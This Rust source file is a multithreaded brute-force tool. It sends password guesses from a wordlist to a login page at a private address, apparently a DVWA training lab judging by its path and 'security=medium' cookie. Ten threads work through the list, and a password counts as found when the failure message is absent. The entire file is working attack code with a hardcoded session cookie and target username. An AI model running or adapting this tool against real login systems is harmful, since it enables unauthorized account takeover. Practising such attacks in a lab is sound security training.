use reqwest::header::{COOKIE, HeaderMap, HeaderValue};
use std::thread;
use std::time::Duration;
use std::{
    error::Error,
    fs::File,
    io::Read,
    sync::{Arc, Mutex},
};

const URL: &'static str = "http://10.164.2.70/vulnerabilities/brute/";
const PHPSESSID: &'static str = "iufnbt40qb8u3g9bhfs5bl02vo"; // Replace with your actual PHPSESSID
const USERNAME: &'static str = "gvanarendonk";
const THREADS: usize = 10;

fn read_passwords(filename: &'static str) -> Vec<String> {
    let file = File::open(filename).unwrap();
    let mut buf_reader = std::io::BufReader::new(file);
    let mut contents = String::new();
    buf_reader.read_to_string(&mut contents).unwrap();
    contents
        .lines()
        .map(|line| line.to_string().to_lowercase())
        .filter(|line| line.chars().all(|c| c.is_alphabetic()))
        .collect()
}

fn try_password(
    client: &reqwest::blocking::Client,
    password: &str,
    counter: &Arc<Mutex<usize>>,
    total_passwords: usize,
    thread_id: usize,
) -> Result<Option<String>, Box<dyn Error + Send + Sync>> {
    {
        let mut count = counter.lock().unwrap();
        *count += 1;
        if *count % 1 == 0 {
            println!("Tried {}/{} passwords", *count, total_passwords);
        }
    }

    // Create headers with PHPSESSID cookie
    let mut headers = HeaderMap::new();
    // Combine both cookies into a single header value
    headers.insert(
        COOKIE,
        HeaderValue::from_str(&format!("PHPSESSID={}; security=medium", PHPSESSID))?,
    );

    // Make the request
    let payload = format!(
        "{}?username={}&password={}&Login=Login#",
        URL, USERNAME, password
    );

    let response = client
        .get(&payload)
        .headers(headers)
        // .timeout(Duration::from_millis(50))
        .send()?;

    let response_text = response.text()?;

    // Check if login was successful
    if !response_text.contains("Username and/or password incorrect.") {
        println!("Thread {} found password: {}", thread_id, password);
        return Ok(Some(password.to_string()));
    }

    Ok(None)
}

pub fn run() -> Result<(), Box<dyn Error>> {
    let passwords = read_passwords("passwords/other.txt");
    let total_passwords = passwords.len();
    let counter = Arc::new(Mutex::new(0));

    println!(
        "Starting brute force with {} passwords across {} threads",
        total_passwords, THREADS
    );

    // Split passwords into chunks for each thread
    let chunk_size = (total_passwords + THREADS - 1) / THREADS; // Ceiling division
    let password_chunks: Vec<Vec<String>> = passwords
        .chunks(chunk_size)
        .map(|chunk| chunk.to_vec())
        .collect();

    let mut handles = vec![];

    // Spawn threads
    for (thread_id, chunk) in password_chunks.into_iter().enumerate() {
        let thread_counter = Arc::clone(&counter);

        let handle = thread::spawn(move || -> Result<(), Box<dyn Error + Send + Sync>> {
            // Create a client for this thread
            let client = reqwest::blocking::Client::builder()
                .pool_idle_timeout(std::time::Duration::from_secs(30))
                .build()?;

            println!(
                "Thread {} starting with {} passwords",
                thread_id,
                chunk.len()
            );

            for password in chunk {
                // Try this password
                match try_password(
                    &client,
                    &password,
                    &thread_counter,
                    total_passwords,
                    thread_id,
                ) {
                    Ok(Some(found)) => {
                        println!("Found password: {}", found);
                        break;
                    }
                    Err(e) => println!("{:?}", e),
                    _ => continue,
                }
                // if let Some(found) = try_password(
                //     &client,
                //     &password,
                //     &thread_counter,
                //     total_passwords,
                //     thread_id,
                // )? {
                //     println!("Found password: {}", found);
                //     break;
                // }
            }

            println!("Thread {} completed", thread_id);
            Ok(())
        });

        handles.push(handle);
    }

    // Wait for all threads to complete
    for (i, handle) in handles.into_iter().enumerate() {
        if let Err(e) = handle.join().unwrap() {
            println!("Thread {} error: {}", i, e);
        }
    }

    Ok(())
}
